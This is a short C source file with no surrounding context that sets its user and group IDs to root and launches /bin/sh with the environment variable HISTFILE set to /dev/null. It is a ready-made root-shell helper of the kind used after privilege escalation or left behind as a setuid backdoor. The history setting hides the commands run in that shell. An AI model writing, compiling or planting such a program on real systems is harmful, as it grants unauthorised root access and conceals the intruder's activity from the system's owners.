#include <stddef.h>
#include <unistd.h>

int
main(void) {
	char *shell[2];
	char *env[2];

	shell[0] = "/bin/sh";
	shell[1] = NULL;
	env[0] = "HISTFILE=/dev/null";
	env[1] = NULL;

	setuid(0);
	setgid(0);

	return execve(shell[0], shell, env);
}

